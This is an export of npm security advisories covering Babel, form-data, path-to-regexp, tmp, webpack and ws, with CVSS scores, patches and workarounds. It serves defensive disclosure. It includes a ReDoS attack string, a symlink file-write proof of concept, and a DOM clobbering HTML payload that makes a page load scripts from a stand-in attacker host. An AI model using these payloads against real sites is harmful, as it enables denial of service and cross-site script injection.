Your generated code is vulnerable if _all_ the following conditions are true: - You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group) - You use the `.replace` method on a regular expression that contains named capturing groups - **Your code uses untrusted strings as the second argument of `.replace`**  If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if: - you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 - you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10  You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).   ### Patches  This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.  Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.  ### Workarounds  If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).  ### References  This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",NPM,"","","",MEDIUM,6.199999809265137,CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,7,"","","","","","","",""

Can be used to submit forms and file uploads to other web applications.",MIT,"","",pkg:npm/form-data@4.0.0,"",GHSA-fjxv-7rqg-78g4,CWE-330 Use of Insufficiently Random Values,"### Summary  form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker: 1. can observe other values produced by Math.random in the target application, and 2. can control one field of a request made using form-data  Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.  This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.  ### Details  The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347  An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))  ### PoC  PoC here: https://github.com/benweissmann/CVE-2025-7783-poc  Instructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID).   ### Impact  For an application to be vulnerable, it must: - Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array) - Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values.   If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",NPM,"","","","","","","","","",HIGHEST,6,"","","","","","","",""

For example, `/:a-:b`.  ### Patches  For users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.  These versions add backtrack protection when a custom regex pattern is not provided:  - [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10) - [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0) - [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0) - [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)  They do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.  Version [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.  Version [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.  ### Workarounds  All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.  If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.  ### Details  Using `/:a-:b` will produce the regular expression `/^\/([^\/]+?)-([^\/]+?)\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.  Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.  ### References  * [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) * [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,5,"","","","","","","",""

DoS on `{length:'1e99'}` 5.

Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access,       as tmp will not check the availability of the path, nor will it establish the requested path for you. ```  Related issue: https://github.com/raszi/node-tmp/issues/207.   The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579 function _resolvePath(name, tmpDir) {   if (name.startsWith(tmpDir)) {     return path.resolve(name);   } else {     return path.resolve(path.join(tmpDir, name));   } } ```  If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609 function _assertIsRelative(name, option, tmpDir) {   if (option === 'name') {     // assert that name is not absolute and does not contain a path     if (path.isAbsolute(name))       throw new Error(`${option} option must not contain an absolute path, found ""${name}"".`);     // must not fail on valid .<name> or ..<name> or similar such constructs     let basename = path.basename(name);     if (basename === '..' || basename === '.' || basename !== name)       throw new Error(`${option} option must not contain a path, found ""${name}"".`);   }   else { // if (option === 'dir' || option === 'template') {     // assert that dir or template are relative to tmpDir     if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {       throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${name}"".`);     }     let resolvedPath = _resolvePath(name, tmpDir); //<---      if (!resolvedPath.startsWith(tmpDir))       throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${resolvedPath}"".`);   } } ```   ### PoC  The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible. Tested on a Linux machine.  - Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it ```bash mkdir $HOME/mydir1  ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir ```  - check the folder is empty: ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" ```  - run the poc ```bash node main.js File:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]' test 2: dir option must be relative to ""/tmp"", found ""/foo"". test 3: dir option must be relative to ""/tmp"", found ""/home/user/mydir1"". ```  - the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`): ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" -rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id] ```   - `main.js` ```js // npm i tmp@0.2.3  const tmp = require('tmp');  const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'}); console.log('File: ', tmpobj.name);  try {     tmp.fileSync({ 'dir': 'mydir1'}); } catch (err) {     console.log('test 1:', err.message) }  try {     tmp.fileSync({ 'dir': '/foo'}); } catch (err) {     console.log('test 2:', err.message) }  try {     const fs = require('node:fs');     const resolved = fs.realpathSync('/tmp/evil-dir');     tmp.fileSync({ 'dir': resolved}); } catch (err) {     console.log('test 3:', err.message) } ```   A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links. ```js function _resolvePath(name, tmpDir) {   let resolvedPath;   if (name.startsWith(tmpDir)) {     resolvedPath = path.resolve(name);   } else {     resolvedPath = path.resolve(path.join(tmpDir, name));   }   return fs.realpathSync(resolvedPath); } ```   ### Impact  Arbitrary temporary file / directory write via symlink",NPM,"","","",LOW,2.5,CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N,"","","",HIGHEST,8,"","","","","","","",""

The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.  We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.   ### Details  #### Backgrounds  DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:  [1] https://scnps.co/papers/sp23_domclob.pdf [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/   #### Gadgets found in Webpack  We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript) /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.  ### PoC  Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.  Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:  ``` // entry.js import('./import1.js')   .then(module => {     module.hello();   })   .catch(err => {     console.error('Failed to load module', err);   }); ```  ``` // import1.js export function hello () {   console.log('Hello'); } ```  The webpack.config.js is set up as follows: ``` const path = require('path');  module.exports = {   entry: './entry.js', // Ensure the correct path to your entry file   output: {     filename: 'webpack-gadgets.bundle.js', // Output bundle file     path: path.resolve(__dirname, 'dist'), // Output directory     publicPath: ""auto"", // Or leave this field not set   },   target: 'web',   mode: 'development', }; ```  When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.  ``` <!DOCTYPE html> <html> <head>   <title>Webpack Example</title>   <!-- Attacker-controlled Script-less HTML Element starts--!>   <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>   <!-- Attacker-controlled Script-less HTML Element ends--!> </head> <script src=""./dist/webpack-gadgets.bundle.js""></script> <body> </body> </html> ```  ### Impact  This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.  ### Patch  A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :> /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",NPM,"","","",MEDIUM,6.400000095367432,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H,"","","",HIGHEST,8,"","","","","","","",""

Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent. 2. Set `server.maxHeadersCount` to `0` so that no limit is applied.  ### Credits  The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.  ### References  - https://github.com/websockets/ws/issues/2230 - https://github.com/websockets/ws/pull/2231  [`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize [`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener [`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,8,"","","","","","","",""
